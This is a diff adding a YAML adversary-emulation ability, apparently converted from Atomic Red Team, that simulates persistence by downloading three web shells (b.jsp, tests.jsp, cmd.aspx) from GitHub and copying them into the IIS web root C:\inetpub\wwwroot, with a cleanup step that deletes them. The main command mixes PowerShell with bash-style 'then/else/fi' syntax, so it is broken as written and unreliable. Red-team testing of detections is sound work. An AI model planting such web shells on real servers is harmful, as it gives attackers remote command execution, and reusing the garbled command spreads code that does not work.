@@ -1,0 +1,68 @@
+- id: 0a2ce662-1efa-496f-a472-2fe7b080db16
+  name: Web Shell Written to Disk
+  description: 'This test simulates an adversary leveraging Web Shells by simulating
+    the file modification to disk.
+
+    Idea from APTSimulator.
+
+    cmd.aspx source - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx'
+  tactic: persistence
+  technique:
+    attack_id: T1505.003
+    name: 'Server Software Component: Web Shell'
+  platforms:
+    windows:
+      sh:
+        command: 'if (Test-Path "PathToAtomicsFolder\T1505.003\src") {exit 0} else
+          {exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\T1505.003\src"
+          -ErrorAction ignore | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/b.jsp"
+          -OutFile "PathToAtomicsFolder\T1505.003\src/b.jsp"; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/tests.jsp"
+          -OutFile "PathToAtomicsFolder\T1505.003\src/tests.jsp"; Invoke-WebRequest
+          "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/cmd.aspx"
+          -OutFile "PathToAtomicsFolder\T1505.003\src/cmd.aspx"; fi; xcopy /I /Y "PathToAtomicsFolder\T1505.003\src"
+          C:\inetpub\wwwroot'
+        cleanup: 'del #{web_shell_path}\b.jsp /q >nul 2>&1; del #{web_shell_path}\tests.jsp
+          /q >nul 2>&1; del #{web_shell_path}\cmd.aspx /q >nul 2>&1'
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1505.003
+  - persistence
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      web_shell_path:
+        description: The path to drop the web shell
+        type: string
+        default: C:\inetpub\wwwroot
+      web_shells:
+        description: Path of Web Shell
+        type: path
+        default: PathToAtomicsFolder\T1505.003\src
+    dependencies:
+    - description: 'Web shell must exist on disk at specified location (#{web_shells})
+
+        '
+      prereq_command: 'if (Test-Path "#{web_shells}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory "#{web_shells}" -ErrorAction ignore
+        | Out-Null
+
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/b.jsp"
+        -OutFile "#{web_shells}/b.jsp"
+
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/tests.jsp"
+        -OutFile "#{web_shells}/tests.jsp"
+
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/cmd.aspx"
+        -OutFile "#{web_shells}/cmd.aspx"
+
+        '
+    technique_created: '2019-12-13T16:46:18.927Z'
+    atomic_guid: 0a2ce662-1efa-496f-a472-2fe7b080db16
+    import_timestamp: '2025-06-24T11:15:04.927215Z'
